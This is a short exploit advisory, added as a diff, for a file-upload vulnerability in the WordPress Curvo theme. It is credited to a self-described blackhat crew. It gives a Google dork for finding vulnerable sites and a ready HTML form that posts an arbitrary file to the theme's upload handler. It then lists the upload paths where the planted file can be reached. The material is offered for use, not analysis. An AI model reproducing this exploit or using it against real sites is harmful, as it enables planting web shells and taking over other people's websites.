@@ -1,0 +1,39 @@
+###################################################################################################
+#_________            .___        _______                ___.   .__        
+#\_   ___ \  ____   __| _/____    \      \   ______  _  _\_ |__ |__| ____  
+#/    \  \/ /  _ \ / __ |/ __ \   /   |   \_/ __ \ \/ \/ /| __ \|  |/ __ \ 
+#\     \___(  <_> ) /_/ \  ___/  /    |    \  ___/\     / | \_\ \  \  ___/ 
+# \______  /\____/\____ |\___  > \____|__  /\___  >\/\_/  |___  /__|\___  >
+#        \/            \/    \/          \/     \/            \/        \/ 
+###################################################################################################
+# Exploit Title: WordPress Curvo Themes CSRF File Upload Vulnerability
+# Author: Byakuya
+# Date: 10/26/2013
+# Vendor Homepage: http://themeforest.net/
+# Themes Link: http://www.wphub.com/themes/curvo-by-themeforest/
+# Price: $35
+# Affected Version: Unknown
+# Infected File: upload_handler.php
+# Category: webapps/php
+# Google dork: inurl:/wp-content/themes/curvo/
+###################################################################################################
+
+# Exploit & POC :
+
+<form enctype="multipart/form-data" 
+action="http://127.0.0.1/wordpress/wp-content/themes/curvo/functions/upload-handler.php" method="post">
+<input type="jpg" name="url" value="./" /><br />
+Please choose a file: <input name="uploadfile" type="file" /><br />
+<input type="submit" value="upload" />
+</form>
+
+#File path: 
+http://site.com/wordpress/wp-content/uploads/[FILE]
+or
+http://site.com/wordpress/wp-content/uploads/[year]/[month]/[FILE] 
+
+#Credit: ./Byakuya ./Mr Ohsem ./Cai ./RatKid ./Agam ./Lord-Router ./X-Tuned ./Official Code-Newbie
+#Facebook: https://www.facebook.com/CodeNewbieCrew
+#Website: http://www.codenewbie.net
+#Malaysia & Indonesia BlackHat
+###################################################################################################
